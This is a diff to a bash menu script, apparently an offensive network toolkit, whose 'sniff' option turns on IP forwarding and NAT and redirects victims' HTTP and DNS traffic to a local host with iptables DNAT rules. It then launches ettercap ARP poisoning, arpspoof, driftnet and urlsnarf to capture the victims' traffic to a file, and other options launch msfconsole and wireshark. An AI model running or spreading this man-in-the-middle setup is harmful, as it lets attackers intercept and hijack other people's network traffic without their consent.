@@ -409,6 +409,8 @@ fi
 
 
 
+
+
 if [ $choix = "sniff" ]
 then
 clear
@@ -470,15 +472,20 @@ sysctl net.ipv4.ip_forward=1
 iptables -t nat -A POSTROUTING -j MASQUERADE
 iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
 iptables -A FORWARD -i $interfacesn -j ACCEPT
-iptables -A FORWARD -i $interfacesn -j ACCEPT
-cd capture-sniffing 
+iptables -A INPUT -p udp --dport 53 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
+    --to-destination 192.168.3.1:80
+    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \
+    --to-destination 192.168.3.1:53
+cd capture-sniffing &>/dev/null
    if [ $? -eq 1 ]
    then
    mkdir capture-sniffing
    else
    cd ..
    fi
-xterm -tilte arp-poisening -e ettercap -Tqi $interfacesn -M arp /// /// | xterm -title sniff1 -e arpspoof -i interfacesn -t $routeursn $ipsn | xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap" | xterm -title sniff -e "urlsnarf -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap"
+xterm -title arp-poisening -e "ettercap -Tqi $interfacesn -M arp /// ///" | xterm -title sniff1 -e "arpspoof -i interfacesn -t $routeursn $ipsn" | xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap" | xterm -title sniff -e "urlsnarf -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap"
 fi
 
 
@@ -495,11 +502,11 @@ xterm -e msfconsole
 fi
 
 
+
 if [ $choix = "shark" ]
 then
 wireshark
 fi
-
 
 
 
